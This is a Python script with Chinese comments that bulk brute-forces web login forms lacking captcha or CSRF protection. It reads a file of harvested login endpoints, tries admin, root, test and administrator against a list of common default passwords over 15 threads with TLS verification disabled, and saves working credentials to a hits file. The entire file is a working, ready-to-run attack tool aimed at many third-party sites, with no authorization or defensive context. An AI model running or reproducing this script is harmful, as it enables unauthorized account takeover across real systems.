#!/usr/bin/env python3
"""bf_simple_login.py - 批量爆破无验证码登录表单
输入: /tmp/real_logins.tsv (dom\tpath\tfields\taction)
只打简单表单(无checkcode/captcha/token)
"""
import urllib.request, urllib.parse, ssl, re, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "123123", "111111", "admin666",
             "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm", "root",
             "test", "123456789", "1qaz2wsx", "qwe123", "admin!@#"]

def fetch(url, timeout=8, data=None, cookies=None):
    try:
        h = {**UA}
        if cookies:
            h["Cookie"] = cookies
        req = urllib.request.Request(url, data=data.encode() if data else None,
            headers={**h, "Content-Type": "application/x-www-form-urlencoded"} if data else h)
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read(80000).decode("utf-8", "ignore"), r.geturl(), r.headers.get("Set-Cookie", "")
    except urllib.error.HTTPError as e:
        return e.code, e.read(80000).decode("utf-8", "ignore"), e.geturl(), e.headers.get("Set-Cookie", "")
    except Exception:
        return 0, "", "", ""

def brute_one(entry):
    dom, path, fields_str, action = entry
    fields = fields_str.split("|") if fields_str else []
    # 跳过带验证码/防CSRF的
    allf = " ".join(fields).lower()
    if any(k in allf for k in ["checkcode", "captcha", "vertify", "auth_code", "csrfmiddlewaretoken", "verification_code", "verifycode", "yzm", "seccode"]):
        return None
    # 提取用户/密码字段(宽松匹配)
    uf = next((f for f in fields if f.lower() in ("username", "user", "name", "account", "loginid", "admin", "log", "loginname", "login_id", "loginid", "email", "uname", "txtuser")), None)
    pf = next((f for f in fields if "pass" in f.lower() or "pwd" in f.lower()), None)
    if not uf or not pf:
        # 尝试大小写不敏感
        uf = next((f for f in fields if f.lower() in ("username", "user", "log", "name", "account", "uname")), None)
        pf = next((f for f in fields if "pass" in f.lower() or "pwd" in f.lower()), None)
    if not uf or not pf:
        return None
    # 首次GET拿cookie
    st0, b0, _, ck = fetch(action if action.startswith("http") else "http://" + dom + action)
    for user in ["admin", "root", "test", "administrator"]:
        for pw in PASSWORDS:
            data = {f: "" for f in fields}
            data[uf] = user
            data[pf] = pw
            st, resp, fu, _ = fetch(action, data=data, cookies=ck)
            if st == 0:
                continue
            low = resp.lower()
            fail = any(m in resp for m in ["错误", "失败", "不正确", "invalid", "wrong", "error", "fail", "denied"])
            if not fail:
                ok = False
                if st == 302 and "login" not in fu.lower() and "signin" not in fu.lower():
                    ok = True
                elif any(k in low for k in ["logout", "退出", "dashboard", "管理首页", "welcome", "控制台", "用户管理"]):
                    if len(resp) > 800:
                        ok = True
                if ok:
                    return (dom, path, user, pw, "st=%s fu=%s" % (st, fu[:60]))
    return None

def main():
    entries = []
    with open("/tmp/real_logins.tsv") as f:
        for line in f:
            parts = line.strip().split("\t")
            if len(parts) >= 4:
                entries.append((parts[0], parts[1], parts[2], parts[3]))
    print("total logins: %d" % len(entries), flush=True)

    hits = []
    with ThreadPoolExecutor(max_workers=15) as ex:
        futs = [ex.submit(brute_one, e) for e in entries]
        done = 0
        for fu in as_completed(futs):
            done += 1
            try:
                r = fu.result()
            except Exception:
                r = None
            if r:
                hits.append(r)
                print("!!! HIT: %s" % "\t".join(str(x) for x in r), flush=True)
            if done % 50 == 0:
                print("progress %d/%d" % (done, len(entries)), flush=True)

    with open("/tmp/login_hits.txt", "w") as f:
        for h in hits:
            f.write("\t".join(str(x) for x in h) + "\n")
    print("=== DONE: %d hits ===" % len(hits), flush=True)

if __name__ == "__main__":
    main()
